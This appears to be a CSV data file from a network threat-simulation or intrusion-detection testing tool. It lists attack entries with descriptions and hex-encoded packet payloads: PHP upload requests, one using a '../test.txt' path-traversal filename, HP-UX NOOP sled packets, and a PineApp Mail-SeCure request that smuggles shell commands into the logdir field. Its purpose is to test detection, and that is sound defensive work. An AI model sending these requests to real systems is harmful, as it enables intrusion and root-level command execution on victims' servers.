XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040720-01_PHP_memory_limit_Vulnerability.xml,PHP memory_limit vulnerability,There is a vulnerability in the way PHP aborts from a memory allocation which exceeds the memory limit. This operation is unsafe during the allocation and initialization of hash table elements. It is possible for an attacker to take control of a memory pointer and execute arbitrary code on the target.,HTTP,TCP,"POST /memlimit/upload.php HTTP/1.1||0D 0A ||Host||3A || 10.2.1.92||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.0||3B || en-US||3B || rv||3A ||1.7) Gecko/20040626 Firefox/0.9.1||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A ||Referer||3A || http||3A ||//10.2.1.92/memlimit/upload.html||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------153501500631101||0D 0A ||Content-Length||3A || 215||0D 0A 0D 0A ||-----------------------------153501500631101||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||userfile||22 3B || filename=||22 ||test.txt||22 0D 0A ||Content-Type||3A || text/plain||0D 0A 0D 0A ||This is a test file||0D 0A 0D 0A ||-----------------------------153501500631101--||0D 0A||"
FSC20040720-01_PHP_memory_limit_Vulnerability.xml,PHP memory_limit vulnerability,There is a vulnerability in the way PHP aborts from a memory allocation which exceeds the memory limit. This operation is unsafe during the allocation and initialization of hash table elements. It is possible for an attacker to take control of a memory pointer and execute arbitrary code on the target.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Wed, 21 Jul 2004 03||3A ||18||3A ||44 GMT||0D 0A ||Server||3A || Apache/2.0.49 (Unix) PHP/4.3.7||0D 0A ||X-Powered-By||3A || PHP/4.3.7||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Transfer-Encoding||3A || chunked||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||ba||0D 0A ||<br />||0A ||<b>Fatal error</b>||3A ||  Allowed memory size of 16384 bytes exhausted at /root/php-4.3.7/Zend/zend_opcode.c||3A ||48 (tried to allocate 3840 bytes) in <b>Unknown</b> on line <b>0</b><br />||0A 0D 0A ||0||0D 0A 0D 0A||"
﻿FSC20040922-01_PHP_Arbitrary_File_Location_Upload_Vulnerability.xml,PHP Arbitrary File Location Upload Vulnerability,"A vulnerability exists in PHP&apos;s handling of the Content-Disposition MIME header. An attacker could control the location of an uploaded file by supplying an arbitrary file name and path through this header. It is possible to exploit this vulnerability and upload a malicious file to an arbitrary location on the vulnerable system, possibly leading to arbitrary code execution.",HTTP,TCP,"POST /files/upload.php HTTP/1.1||0A ||Host||3A || 10.2.1.79||0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.0||3B || rv||3A ||1.7.3) Gecko/20040913 Firefox/0.10||0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0A ||Accept-Encoding||3A || gzip,deflate||0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0A ||Keep-Alive||3A || 300||0A ||Connection||3A || keep-alive||0A ||Referer||3A || http||3A ||//10.2.1.92/files/upload.html||0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------8342223121046||0A ||Content-Length||3A || 296||0A 0A ||-----------------------------8342223121046||0A ||Content-Disposition||3A || form-data||3B || name=||22 ||file||22 3B || filename=||22 ||../test.txt||22 0A ||Content-Type||3A || text/plain||0A 0A ||Text file||0A 0A ||-----------------------------8342223121046||0A ||Content-Disposition||3A || form-data||3B || name=||22 ||upload||22 0A 0A ||Upload file||0A ||-----------------------------8342223121046--||0A 0A||"
FSC20040922-01_PHP_Arbitrary_File_Location_Upload_Vulnerability.xml,PHP Arbitrary File Location Upload Vulnerability,"A vulnerability exists in PHP&apos;s handling of the Content-Disposition MIME header. An attacker could control the location of an uploaded file by supplying an arbitrary file name and path through this header. It is possible to exploit this vulnerability and upload a malicious file to an arbitrary location on the vulnerable system, possibly leading to arbitrary code execution.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Wed, 22 Sep 2004 20||3A ||02||3A ||24 GMT||0D 0A ||Server||3A || Apache/2.0.47 (Fedora)||0D 0A ||X-Powered-By||3A || PHP/4.3.3||0D 0A ||Connection||3A || close||0D 0A ||Transfer-Encoding||3A || chunked||0D 0A ||Content-Type||3A || text/html||3B || charset=UTF-8||0D 0A 0D 0A ||c||0D 0A ||Vulnerable.||0A 0D 0A ||3a||0D 0A ||The file would be saved in <upload_directory>/../test.txt||0A 0D 0A ||0||0D 0A 0D 0A||"
﻿NOOPtcpHP-UNIX.xml,TCP NOOP Packet Variant HP-UNIX,"This threat sends a TCP packet that appears to be part of an existing valid connection with a NOOP sled in it. A NOOP sled is used by shellcode to insure that the injected code will execute. Unfortunately, there are many other reasons why a NOOP might appear in traffic. This threat utilized equivalent assembly instructions to the standard NOOP instruction.",TCP,TCP,||08 ||!||02 80 08 ||!||02 80 08 ||!||02 80 08 ||!||02 80||
﻿NOOPtcpHP-UNIX2.xml,TCP NOOP Packet Variant HP-UNIX 2,"This threat sends a TCP packet that appears to be part of an existing valid connection with a NOOP sled in it. A NOOP sled is used by shellcode to insure that the injected code will execute. Unfortunately, there are many other reasons why a NOOP might appear in traffic. This threat utilized equivalent assembly instructions to the standard NOOP instruction.",TCP,TCP,||0B ||9||02 80 0B ||9||02 80 0B ||9||02 80 0B ||9||02 80||
﻿NOOPudpHP-UNIX.xml,UDP NOOP Variant HP-UNIX,"This threat sends UDP packets with a payload filled with NOOP assembly instructions. This gets flagged on IDS systems as a possible shellcode injection attack. NOOPs are used as a sled to insure more probability for shellcode to execute. Unfortunately, NOOPs are also quite common in binary downloads from websites as well, causing many false positives.",UDP,UDP,||08 ||!||02 80 08 ||!||02 80 08 ||!||02 80 08 ||!||02 80||
﻿NOOPudpHP-UNIX2.xml,UDP NOOP Variant HP-UNIX 2,"This threat sends UDP packets with a payload filled with NOOP assembly instructions. This gets flagged on IDS systems as a possible shellcode injection attack. NOOPs are used as a sled to insure more probability for shellcode to execute. Unfortunately, NOOPs are also quite common in binary downloads from websites as well, causing many false positives.",UDP,UDP,||0B ||9||02 80 0B ||9||02 80 0B ||9||02 80 0B ||9||02 80||
﻿TSL20130729-15_PineApp_Mail-SeCure_confpremenu.php_Export_Log_Command_Injection.xml,PineApp Mail-SeCure confpremenu.php Export Log Command Injection,"A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while exporting logs.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","HTTPS,HTTP",TCP,POST /admin/confpremenu.php HTTP/1.0||0D 0A ||Content-Length||3A || 94||0D 0A ||Content-Type||3A || application/x-www-form-urlencoded||0D 0A 0D 0A ||pa_run_protection=281x340v&syslog_export_log=1&logname=a&logdir=/tmp||3B ||date>/tmp/poc.txt||3B ||echo%20
TSL20130729-15_PineApp_Mail-SeCure_confpremenu.php_Export_Log_Command_Injection.xml,PineApp Mail-SeCure confpremenu.php Export Log Command Injection,"A command execution vulnerability exists in PineApp Mail-SeCure. The vulnerability is due to an input validation
error in the confpremenu.php script while exporting logs.
A remote attacker can exploit this vulnerability by sending a specially crafted request to the vulnerable server.
Successful exploitation could result in commands being executed with root privileges.","HTTPS,HTTP",TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Mon, 05 Aug 2013 13||3A ||21||3A ||48 GMT||0D 0A ||Server||3A || Apache||0D 0A ||Set-Cookie||3A || SESSIONID=413a1c6c6629903efb8000346844cbf8||3B || path=/||0D 0A ||Expires||3A || Thu, 19 Nov 1981 08||3A ||52||3A ||00 GMT||0D 0A ||Cache-Control||3A || no-store, no-cache, must-revalidate, post-check=0, pre-check=0||0D 0A ||Pragma||3A || no-cache||0D 0A ||Content-disposition||3A || attachment||3B || filename=||22 ||a.log||22 0D 0A ||Content-transfer-encoding||3A || binary||0D 0A ||Content-length||3A || 0||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || application/octet-stream||0D 0A 0D 0A||"
